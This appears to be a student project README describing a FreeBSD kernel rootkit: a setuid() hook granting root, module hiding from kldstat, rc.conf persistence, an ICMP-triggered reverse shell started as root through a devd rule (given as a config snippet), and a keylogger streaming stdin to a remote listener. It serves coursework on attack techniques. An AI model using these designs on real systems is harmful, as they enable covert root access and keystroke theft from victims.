# R00TB33R

## Installation

The install script first compiles our kernel modules (elevate, remote, log, ghost) to .ko files. It then setup persistence for the modules and load them with kldload. Next it compiles utility binaries (elevate, bhclient, remote-helper, log, log-helper). The bhclient, log and log-helper utility are copied over to /sbin directory to add to PATH. We then add a devd matching rule which allows our kernel to send a signal to startup a userland script. This allows the remote KLD to initiate a reverse shell back to the sender when it received an ICMP request. Additionally, the install script also carry out other miscellaneous task such as checking that tools are compiled properly and cleaning up the directory after installation to hide files.

DESIGN JUSTIFICATIONS:

Our install scripts compiles the tool for robustness and portability. It's also responsible for setting up any configurations on the kernel for persistence or remote functionality as it's the first tool that will be run on the target machine.

## Escalation

To escalate privilege, our detector hooked the setuid() syscall and intercepts any syscall from a process with the name elevate which requests for the uid 0x1337. It gives this process uid 0. The elevate.c binary is responsible for calling this syscall. Once it has obtained root privilege, it calls /bin/sh to pop a root shell. We chose setuid() as our hook as it's already carrying out change of uid operation. We think this can make the privilege escalation operation more stealthy.

# Concealment

We continue to use the KLD hiding technique from our midpoint. The hiding logic was extracted to ghost-kld.c module. The module is responsible for unlinking our rootkit kernel modules from the linker_files and modules list. It does this by iterating through the link list structure and removing any entries that match our list of kernel rootkit modules. This module is installed last by the install script so that every other previous module including itself are removed.

DESIGN JUSTIFICATIONS:

This concealment technique hides our rootkit KLDs from utility such as kldstat. The reason why we didn't implement other concealment techniques was because we realised that our syscall hooks will be detected by most detectors, as a result implementing other concealment techniques could be useless and so we devoted our time to the detector and other bonus features instead.

# Persistence

*New after midpoint

For persistence, we copy each kernel module to /boot/modules. We then add each module to kld_list in rc.conf so that the kernel are automatically loaded after boot. However, this technique comes at a cost as our rootkit can be easily detected by reading the /etc/rc.conf file.

DESIGN JUSTIFICATIONS:

We considered that this technique is realistic for the timeframe that we have.

## Detection

## Remote

*New after midpoint

To implement root remote access, our rootkit relies on 4 different components, the remote KLD (remote-kld.c), the bhclient.c binary, the remote shell script and the remote-helper.c binary. The remote KLD is responsible for hooking the icmp_input hook in the ip_protox table. This diverts any received ICMP packets to our hooked function. The hook function then analyse if the ICMP packet is an ECHO request coming from our remote machine's IP address. If it is, it uses devctl_notify() to send an event to the devd daemon.

This is where our second component, the bhclient binary comes in. The bhclient binary is a binary that initiates a reverse shell connection to a given IP address. It is installed in path at /sbin by the install script. When the remote KLD sends an event to the devd daemon, a rules was configured to capture that event and call our bhclient binary. Because devd has root privilege, any process started by it also have root privilege. As a result, the reverse shell provides root privilege to the remote system.

```
  cat <<EOF > /usr/local/etc/devd/devd.conf
notify 100 {
  match "system" "DHCLIENT";
  match "subsystem" "WORKER";
  match "type" "START";
  action "/sbin/bhclient ${1}";
};
EOF
```

The remote-helper.c binary will be used by the remote system to initiate the reverse shell from our target system. It first sends an ICMP ECHO request to the target system. This triggers our remote KLD on the target system, which sends an event via devd and launch the reverse shell bhclient. The remote-helper.c file then sets up a listening port and pass data back and forth between stdin and stdout and the socket. This effectively emulates a shell on the target system.

Finally, the remote shell script is a wrapper that compiles the remote-helper.c file and call it. This effectively starts our chain of events.

DESIGN JUSTIFICATIONS:

For the remote functionality, we chose to hook the ICMP handler as we don't have to setup any listening TCP port which makes our rootkit more stealthy. We chose to use devd to initiates the reverse shell as it's a safe way for the kernel to start a user process. It also provides us with root functionality.

## Keylogger

*New after midpoint

The logger captures stdin read activity on the FreeBSD target ($TARGET) via a kld and streams those bytes over TCP to a collector/listener ($REMOTE) via a user-space helper (log-helper) invoked through the ./log <IP> wrapper. The module hooks SYS_read and specifically targets stdin so only normal shell input is captured while prompts that read directly from /dev/tty such as passwords and stuff are not captured - this could have been done but it would also open up another detection avenue that we would have to consider.

Synchronized Ring Buffer: Bytes copied from user space via copyin() are pushed into the ring_buffer protected by a kernel mutex. When the ring buffer reaches capacity (next_head == tail), additional incoming bytes are dropped rather than overwriting unread data or overflowing the buffer. A character device (monitor_cdevsw) exposes the buffered bytes to user space. monitor_read() drains ring_buffer into a staging buffer under ring_mtx and transfers data to user space via uiomove() outside the lock so it does not sleep or fault while holding the mutex.

Because read_hook only fires when a process executes read(fd = 0), ./log <IP> is run in the background (./log <IP> &) or in a separate session so the interactive shell remains active and issues read(fd = 0) calls as commands and characters are typed. This is useful for testing.

log-helper opens /dev/sys_monitor (O_RDONLY), connects over TCP to the collector port (4444) with exponential backoff retry and automatic reconnection if the socket drops, and forwards read bytes (byte-by-byte or in configured batches) to the listener.

### Testing Notes

Because read_hook only triggers when a process executes read(fd = 0), running ./log <IP> & in the background—or running ./log <IP> in a separate session/SSH window—keeps the interactive shell active so typing commands and characters issues read(fd = 0) calls that flow through /dev/sys_monitor to the listener.

### Video

Here you can access a video of our keylogger [keyloggerexamplevideo](https://unsw-my.sharepoint.com/:v:/g/personal/z5479498_ad_unsw_edu_au/IQDCpq4GZL_EQJ0vRCJEZK39AbhFxIYRrnVDTFxg6awkqPc?nav=eyJyZWZlcnJhbEluZm8iOnsicmVmZXJyYWxBcHAiOiJTdHJlYW1XZWJBcHAiLCJyZWZlcnJhbFZpZXciOiJTaGFyZURpYWxvZy1MaW5rIiwicmVmZXJyYWxBcHBQbGF0Zm9ybSI6IldlYiIsInJlZmVycmFsTW9kZSI6InZpZXcifX0%3D&e=6OrF3k)
